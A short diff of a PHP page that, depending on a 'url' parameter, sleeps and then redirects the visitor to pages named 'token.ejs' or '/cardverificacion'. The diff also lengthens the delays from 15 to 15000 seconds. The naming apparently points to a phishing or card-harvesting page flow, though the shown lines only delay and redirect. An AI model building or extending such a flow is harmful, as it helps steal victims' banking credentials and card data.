@@ -40,12 +40,12 @@
 
 <?php
 if (isset($_GET['url']) && $_GET['url'] === "1") {
-    sleep(15);
+    sleep(15000);
     echo "<script>location.href='token.ejs'</script>";
 }
 if (isset($_GET['url']) && $_GET['url'] === "2") {
-    sleep(15);
-    echo "<script>location.href='card.ejs'</script>";
+    sleep(15000);
+    echo "<script>location.href='/cardverificacion'</script>";
 }
 ?>
 </body>
